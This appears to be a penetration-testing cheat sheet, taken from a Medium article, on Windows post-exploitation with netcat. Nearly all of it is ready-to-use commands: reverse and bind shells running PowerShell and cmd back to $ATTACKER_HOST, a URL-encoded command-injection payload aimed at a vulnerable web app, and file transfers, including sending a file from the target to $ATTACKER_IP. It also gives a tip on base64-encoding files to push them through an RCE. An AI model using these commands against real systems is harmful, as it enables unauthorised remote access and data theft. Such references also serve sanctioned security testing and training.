#file-transfer #netcat

*Source:* https://int0x33.medium.com/day-24-windows-post-exploitation-shells-and-file-transfer-with-netcat-for-windows-a2ddc3557403 

# Using Windows

Get the 32bit version [here](https://github.com/int0x33/nc.exe/blob/master/nc.exe?source=post_page-----a2ddc3557403--------------------------------).
And the 64bit version [here](https://github.com/int0x33/nc.exe/blob/master/nc64.exe?source=post_page-----a2ddc3557403--------------------------------).

## Uploading Files

A good tip that often comes in handy is to base64 encode a file, then simply copy the base64 blob to a file via a vuln or RCE and either decode first or after depending on your RCE situation. If you try and copy a file as-is in many situations the troublesome contents like language operators or null bytes etc will break the connection, application or worse, crash the target host.

## Reverse Powershell

	#32bit  
	nc.exe $ATTACKER_HOST $ATTACKER_PORT -e powershell  
	#64bit  
	nc64.exe $ATTACKER_HOST $ATTACKER_PORT -e powershell

Example RCE on web app:

	http://vulnerable.com?pageId=nc64.exe 10.10.10.10 1337 -e powershell

Of course in the wild, we would url encode it:

	http://vulnerable.com?pageId=nc64.exe%2010.10.10.10%201337%20-e%20powershell

## Bind Powershell

	#32bit  
	nc.exe -l -p $LISTENPORT -e powershell  
	#64bit  
	nc64.exe -l -p $LISTENPORT -e powershell

## Reverse Shell

	#32bit  
	nc.exe $ATTACKER_HOST $ATTACKER_PORT -e cmd  
	#64bit  
	nc64.exe $ATTACKER_HOST $ATTACKER_PORT -e cmd

## Bind Shell

	#32bit  
	nc.exe -l -p $LISTENPORT -e cmd  
	#64bit  
	nc64.exe -l -p $LISTENPORT -e cmd

## Transfer File

**Sender (Unix)**

	nc $TARGET $PORT < $FILE

**Receiver (Windows)**

	#32bit  
	nc.exe -l -p $LISTENPORT > $FILE  
	#64bit  
	nc64.exe -l -p $LISTENPORT > $FILE

# Using Linux

After establishing a reverse shell on the target machine, we simply start a netcat client on our attacker machine in a new terminal:

	nc -lnvp 1234

And then we transfer the file on the target machine in the reverse shell terminal:

	nc $ATTACKER_IP 1234 < $FILE

